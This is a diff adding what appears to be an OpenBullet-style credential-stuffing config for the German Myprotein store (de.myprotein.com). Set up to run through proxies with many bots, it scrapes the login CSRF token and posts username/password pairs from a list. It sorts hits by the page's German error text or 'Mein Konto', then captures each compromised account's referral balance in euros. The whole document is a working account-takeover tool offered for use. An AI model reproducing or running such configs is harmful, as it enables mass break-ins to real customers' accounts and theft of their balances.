@@ -1,0 +1,95 @@
+[SETTINGS]
+{
+  "Name": "de.myprotein.com",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-24T21:34:08.301014+02:00",
+  "AdditionalInfo": "",
+  "Author": "tharising",
+  "Version": "1.3.5 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Transparent": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#VS REQUEST GET "https://de.myprotein.com/elysiumAuthentication.login" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 156" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: de.myprotein.com" 
+  HEADER "Origin: https://de.myprotein.com" 
+  HEADER "Referer: https://de.myprotein.com/login.jsp?returnTo=https%3A%2F%2Fde.myprotein.com%2FaccountHome.account" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+
+#GT PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"csrf_token\" value=\"" "\"/>" -> VAR "Token" 
+
+#LS REQUEST POST "https://de.myprotein.com/elysiumAuthentication.login" 
+  CONTENT "elysium_username=<USER>&elysium_password=<PASS>&returnTo=https%3A%2F%2Fde.myprotein.com%2FaccountHome.account&csrf_token=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 156" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: de.myprotein.com" 
+  HEADER "Origin: https://de.myprotein.com" 
+  HEADER "Referer: https://de.myprotein.com/login.jsp?returnTo=https%3A%2F%2Fde.myprotein.com%2FaccountHome.account" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+
+#CAT KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Eine oder mehrere Ihrer Angaben sind falsch. Bitte überprüfen Sie diese und versuchen Sie es erneut." 
+  KEYCHAIN Success OR 
+    KEY "Mein Konto" 
+
+#Visit_Home REQUEST GET "https://de.myprotein.com/accountHome.account" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: de.myprotein.com" 
+  HEADER "Referer: https://de.myprotein.com/accountHome.account" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+
+#Capture PARSE "<SOURCE>" LR "referralsCard_stat\">" "&#8364;</p>" -> CAP "balance" "" "€" 
+
